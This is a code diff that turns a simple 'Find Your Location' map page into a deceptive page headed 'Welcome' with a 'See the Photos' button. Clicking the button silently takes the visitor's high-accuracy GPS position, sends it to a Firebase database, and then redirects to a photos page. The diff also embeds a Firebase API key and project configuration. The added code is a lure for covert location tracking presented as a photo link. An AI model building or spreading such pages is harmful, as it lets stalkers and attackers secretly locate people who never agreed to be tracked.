@@ -4,57 +4,66 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Tracker</title>
-    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
-    <style>
-        #map { height: 300px; width: 100%; margin-top: 20px; }
-    </style>
 </head>
 <body>
-    <h2>Find Your Location</h2>
-    <button onclick="getLocation()">Get My Location</button>
-    <p id="output">Your location will appear here.</p>
-    <div id="map"></div>
+    <h1>Welcome</h1>
+    <button id="locationBtn">See the Photos</button>
 
-    <script>
-        function getLocation() {
+    <script type="module">
+        // Import Firebase SDKs
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
+        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-database.js";
+
+        // Firebase Configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAETlxhc4ikjHzZLGLADVNfCQPQqlNQs2Q",
+            authDomain: "location-9ba94.firebaseapp.com",
+            projectId: "location-9ba94",
+            storageBucket: "location-9ba94.firebasestorage.app",
+            messagingSenderId: "447200014548",
+            appId: "1:447200014548:web:f03234c59a1fbe73864b41",
+            measurementId: "G-Y4Y8XNGNWQ"
+        };
+
+        // Initialize Firebase
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Button Click Event
+        document.getElementById("locationBtn").addEventListener("click", () => {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(showPosition, showError);
+                navigator.geolocation.getCurrentPosition(sendLocation, showError, {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                });
             } else {
-                document.getElementById("output").innerHTML = "Geolocation is not supported by this browser.";
+                alert("Geolocation is not supported by this browser.");
             }
+        });
+
+        // Function to send location to Firebase
+        function sendLocation(position) {
+            const latitude = position.coords.latitude;
+            const longitude = position.coords.longitude;
+            const accuracy = position.coords.accuracy;
+            const timestamp = new Date().toLocaleString();
+
+            // Store location in Firebase
+            push(ref(database, "locations"), {
+                latitude: latitude,
+                longitude: longitude,
+                accuracy: accuracy,
+                timestamp: timestamp
+            });
+
+            // Redirect to photos page
+            window.location.href = "photos.html";
         }
 
-        function showPosition(position) {
-            let lat = position.coords.latitude;
-            let lon = position.coords.longitude;
-            document.getElementById("output").innerHTML = `Latitude: ${lat}, Longitude: ${lon}`;
-            
-            let map = L.map('map').setView([lat, lon], 13);
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                attribution: '© OpenStreetMap contributors'
-            }).addTo(map);
-            
-            L.marker([lat, lon]).addTo(map)
-                .bindPopup("You are here!")
-                .openPopup();
-        }
-
+        // Handle Location Errors
         function showError(error) {
-            switch (error.code) {
-                case error.PERMISSION_DENIED:
-                    document.getElementById("output").innerHTML = "User denied the request for Geolocation.";
-                    break;
-                case error.POSITION_UNAVAILABLE:
-                    document.getElementById("output").innerHTML = "Location information is unavailable.";
-                    break;
-                case error.TIMEOUT:
-                    document.getElementById("output").innerHTML = "The request to get user location timed out.";
-                    break;
-                case error.UNKNOWN_ERROR:
-                    document.getElementById("output").innerHTML = "An unknown error occurred.";
-                    break;
-            }
+            alert("Location access denied or an error occurred.");
         }
     </script>
 </body>
